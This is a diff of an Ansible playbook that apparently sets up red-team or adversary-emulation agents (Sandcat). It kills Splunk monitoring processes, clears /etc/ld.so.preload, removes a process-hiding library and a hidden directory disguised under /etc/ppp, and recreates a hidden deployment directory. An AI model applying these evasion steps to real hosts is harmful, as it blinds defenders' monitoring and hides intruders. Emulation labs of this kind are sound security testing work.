@@ -19,12 +19,6 @@
           - gcc
         state: present
 
-    - name: Create base hidden deployment directory
-      file:
-        path: "{{ deploy_dir }}"
-        state: directory
-        mode: "0755"
-
     # Clean up existing agents if any (optional pre-clean)
     - name: kill process splunk
       shell: pkill -9 -f splunk || true
@@ -56,16 +50,31 @@
           -name 'ragdoll*' \
         \) -exec rm -rf {} + || true
       ignore_errors: yes
+    
+    - name: Delete privous hidden deployment directory
+      file:
+        path: /etc/ppp/.syslogs-backup
+        state: absent
 
-    - name: Clean up previous kernel link
-      shell: "sudo echo '' > /etc/ld.so.preload"
+    - name: Clear ld.so.preload file
+      copy:
+        content: ""
+        dest: /etc/ld.so.preload
+        owner: root
+        group: root
+        mode: '0644'
       ignore_errors: yes
 
     - name: Delete previous created process.so
       file:
-        path: /usr/local/lib/process.so
+        path: /usr/local/lib/libprocesshider.so
         state: absent
 
+    - name: Create base hidden deployment directory
+      file:
+        path: "{{ deploy_dir }}"
+        state: directory
+        mode: "0755"
   
     # Deploy agents
     # HTTP AGENTS (Sandcat)
